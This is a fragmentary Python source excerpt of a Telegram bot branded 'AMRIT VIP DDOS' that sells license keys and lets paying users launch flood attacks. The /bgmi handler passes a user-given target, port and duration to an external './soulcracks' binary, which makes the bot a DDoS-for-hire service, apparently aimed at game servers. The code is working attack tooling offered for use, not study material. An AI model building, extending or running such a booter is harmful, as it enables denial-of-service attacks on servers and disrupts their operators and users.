...
# Admin user IDs
admin_id = {"6312238286"}  # Replace with actual admin ID
...
def generate_key(length=10):
    ...
    return f"AMRIT-𝗩𝗜𝗣-{key.upper()}"  # Ensure key is in uppercase
...
def start_command(message):
    ...
    if user_id in users:
        ...
        response = f"⚡️𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 AMRIT 𝕍𝕀ℙ 𝔻𝔻𝕆𝕊⚡️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 @{message.chat.username}!\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n• /bgmi - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n• /check - 𝗟𝗶𝘇𝗮𝗿𝗱 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @AMRIT_MODZ_OWNER\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        response = f"⚡ 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 AMRIT 𝕍𝕀ℙ 𝔻𝔻𝕆𝕊⚡️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 @{message.chat.username}!\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗: {user_id}\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n• /bgmi - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n• /check - 𝗟𝗶𝘇𝗮𝗿𝗱 𝗦𝘆𝘀𝘁𝗲𝗺 𝗦𝘁𝗮𝘁𝘂𝘀\n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 ❌\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @AMRIT_MODZ_OWNER\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
    ...
    if user_id in admin_id:
        ...
        if len(command) == 3:
            try:
                ...
                response = f"✅ ̶G̶̶E̶̶N̶̶E̶̶R̶̶A̶̶T̶̶E̶ ̶S̶̶U̶̶C̶̶C̶̶E̶̶S̶̶S̶̶F̶̶U̶̶L̶̶L̶̶Y̶  ✅\n\n𝗞𝗲𝘆: `{key}`\n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {time_amount} {time_unit}"
            except ValueError:
                response = "𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲"
        else:
            response = "𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝘁𝗶𝗺𝗲> <𝘂𝗻𝗶𝘁>"
    else:
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @AMRIT_MODZ_OWNER"
...
def redeem_key_command(message):
    ...
    if len(command) == 2:
        ...
        if key in keys:
            ...
            response = "📛 𝖪𝖤𝖸 𝖤𝖷𝖯𝖨𝖱𝖤𝖣 𝖮𝖱 𝖨𝖭𝖵𝖠𝖫𝖨𝖣  📛"
    else:
        response = "💎 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗠𝗣𝗧𝗜𝗢𝗡 💎\n━━━━━━━━━━━━━━━\n📝 𝗨𝘀𝗮𝗴𝗲: /redeem 𝗟𝗜𝗭𝗔𝗥𝗗 𝗩𝗜𝗣-𝗫𝗫𝗫\n\n⚠️ 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁 𝗡𝗼𝘁𝗲𝘀:\n• 𝗞𝗲𝘆𝘀 𝗮𝗿𝗲 𝗰𝗮𝘀𝗲-𝘀𝗲𝗻𝘀𝗶𝘁𝗶𝘃𝗲\n• 𝗢𝗻𝗲-𝘁𝗶𝗺𝗲 𝘂𝘀𝗲 𝗼𝗻𝗹𝘆\n• 𝗡𝗼𝗻-𝘁𝗿𝗮𝗻𝘀𝗳𝗲𝗿𝗮𝗯𝗹𝗲\n\n🔑 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /redeem 𝗟𝗜𝗭𝗔𝗥𝗗-𝗩𝗜𝗣-𝗔𝗕𝗖𝗗𝟭𝟮𝟯𝟰\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆? 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀/n━━━━━━━━━━━━━━━"
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./soulcracks {target} {port} {time} 900 "  # Replace with actual attack command
...
def handle_attack(message):
    user_id = str(message.chat.id)
    cooldown_time = 60  # Cooldown in seconds (e.g., 60 seconds)

    # Check if the user has VIP access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝕐𝕆𝕌ℝ 𝔸ℂℂ𝔼𝕊𝕊 ℍ𝔸𝕊 𝔼𝕏ℙ𝕀ℝ𝔼𝔻 ❗️"
            bot.reply_to(message, response)
            return
